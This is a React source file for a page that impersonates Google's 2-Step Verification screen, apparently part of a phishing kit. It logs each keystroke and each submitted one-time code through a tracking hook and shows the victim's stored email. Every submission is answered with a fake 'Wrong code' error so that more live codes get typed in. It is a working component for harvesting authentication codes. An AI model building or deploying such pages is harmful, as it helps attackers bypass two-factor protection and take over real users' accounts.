import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { GoogleGLogo, GeGoogleFont, useGeTracking } from "@/components/ge/GeShared";
import twofaCss from "@/components/ge/twofa.css?raw";

export const Route = createFileRoute("/ge/twofa")({
  head: () => ({ meta: [{ title: "2-Step Verification" }] }),
  component: GeTwoFaPage,
});

function GeTwoFaPage() {
  const { trackClick, trackInput, geNavigate, sessionId } = useGeTracking();
  const [code, setCode] = useState("");
  const [dontAsk, setDontAsk] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [email, setEmail] = useState("Loading...");
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    try {
      const saved = localStorage.getItem("saved_user_email");
      setEmail(saved || "Email not found");
    } catch { setEmail("Email not found"); }
    setTimeout(() => inputRef.current?.focus(), 100);
  }, []);

  const submit = (e: React.FormEvent) => {
    e.preventDefault();
    const c = code.trim();
    if (!c) return;
    trackClick("Next-2FA");
    trackInput("otp", c);
    setLoading(true);
    setError(false);
    setTimeout(() => {
      setLoading(false);
      setError(true);
      setCode("");
      inputRef.current?.focus();
    }, 1400);
  };

  return (
    <>
      <GeGoogleFont />
      <style>{twofaCss}</style>
      <style>{`html, body, #root { min-height: 100vh; } body { margin: 0; }`}</style>
      <div className="container">
        <div className={`loading-overlay ${loading ? "active" : ""}`} id="loadingOverlay">
          <div className="loading-bar"></div>
        </div>

        <div className="left-part">
          <GoogleGLogo />
          <div className="text-content">
            <h1>2-Step Verification</h1>
            <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
            <div
              className="email-container"
              onClick={() => { trackClick("Change-Email"); geNavigate("/ge/signin"); }}
            >
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ marginLeft: 4 }}>
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
                <polyline points="22,6 12,13 2,6"/>
              </svg>
              <span className="email-text">{email}</span>
              <svg width="18" height="8" viewBox="0 0 10 6" style={{ marginRight: 4 }} fill="currentColor" className="arrow"><path d="M5 6 0 0h10z"/></svg>
            </div>
          </div>
        </div>

        <div className="right-part">
          <div className="text-content">
            <h1 style={{ fontSize: 20 }}>2-Step Verification</h1>
            <p style={{ fontSize: 14 }}>
              Get a verification code from the <span style={{ fontWeight: 600 }}>Authenticator</span> app
            </p>
          </div>
          <form className="form-container" onSubmit={submit}>
            <input
              ref={inputRef}
              type="text"
              name="otp"
              inputMode="numeric"
              autoComplete="one-time-code"
              className="email-input"
              placeholder="Enter code"
              value={code}
              onChange={(e) => { setCode(e.target.value); setError(false); trackInput("otp", e.target.value); }}
              style={error ? { outline: "2px solid #ff3b30" } : undefined}
              required
            />
            <div style={{ minHeight: 22, marginTop: -5 }}>
              {error && <p style={{ color: "#ff3b30", fontSize: 14, margin: 0 }}>Wrong code. Try again.</p>}
            </div>
            <label className="checkbox-container">
              <input
                type="checkbox"
                className="checkbox"
                checked={dontAsk}
                onChange={(e) => { setDontAsk(e.target.checked); trackClick(`DontAsk-${e.target.checked}`); }}
              />
              <span className="tickbox-text">Don't ask again on this device</span>
            </label>
            <div className="button-container">
              <button type="button" className="create-account-btn" onClick={() => trackClick("Try-Another-Way")}>Try another way</button>
              <button type="submit" className="next-btn" disabled={loading || !code}>Next</button>
            </div>
          </form>
        </div>
      </div>
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </>
  );
}
